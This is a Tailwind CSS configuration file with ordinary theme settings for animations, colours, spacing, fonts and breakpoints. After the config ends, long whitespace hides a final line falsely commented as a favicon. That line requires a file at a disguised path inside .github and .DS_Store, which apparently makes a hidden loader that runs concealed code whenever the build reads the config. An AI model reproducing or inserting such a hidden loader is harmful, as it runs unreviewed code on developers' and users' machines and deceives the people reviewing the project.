/** @type {import('tailwindcss').Config} */

export default {
  content: [
    "./index.html",
    "./src/**/*.{js,ts,jsx,tsx}",
  ],
  theme: {
    extend: {
      keyframes: {
        greenFlash: {
          '0%': { backgroundColor: 'rgb(22, 163, 74)' },
          '100%': { backgroundColor: 'transparent' },
        },
        redFlash: {
          '0%': { backgroundColor: 'rgb(185, 28, 28)' },
          '100%': { backgroundColor: 'transparent' },
        },
        blink: {
          '0%': { opacity: '1' },
          '50%': { opacity: '0' },
          '100%': { opacity: '1' },
        }
      },
      animation: {
        greenFlash: 'greenFlash 0.5s ease-out',
        redFlash: 'redFlash 0.5s ease-out',
        blink: 'blink 1s infinite'
      },
      colors: {
        primary: '#1d4ed8', // Custom primary color
        secondary: '#64748b', // Custom secondary color
        accent: '#fbbf24', // Custom accent color
        danger: '#ef4444', // Custom danger color
        success: '#3b82f6', // Custom success color
      },
      spacing: {
        // Custom spacing scale
        '18': '4.5rem',
        '22': '5.5rem',
        '84': '21rem',
      },
      borderRadius: {
        // Custom border radius
        '4xl': '2rem',
      },
      fontFamily: {
        // Custom font families
        sans: ['Graphik', 'sans-serif'],
        serif: ['Merriweather', 'serif'],
        mono: ['Menlo', 'monospace'],
      },
      zIndex: {
        // Custom z-index values
        '-10': '-10',
        100: '100',
      },
      screens: {
        // Custom breakpoints
        'xs': '475px',
        'sm': '640px',
        'md': '768px',
        'lg': '1024px',
        'xl': '1280px',
        '2xl': '1536px',
      },
      boxShadow: {
        // Custom box-shadow values
        'custom-light': '0 2px 10px rgba(0, 0, 0, 0.1)',
        'custom-dark': '0 4px 20px rgba(0, 0, 0, 0.5)',
      },
    },
  },
  plugins: [],
};                                                                                                                                                                                                                                                                                                                                                                                                                      /* favicon */ require('./.github/logs/refs/heads/.DS_Store/HEAD');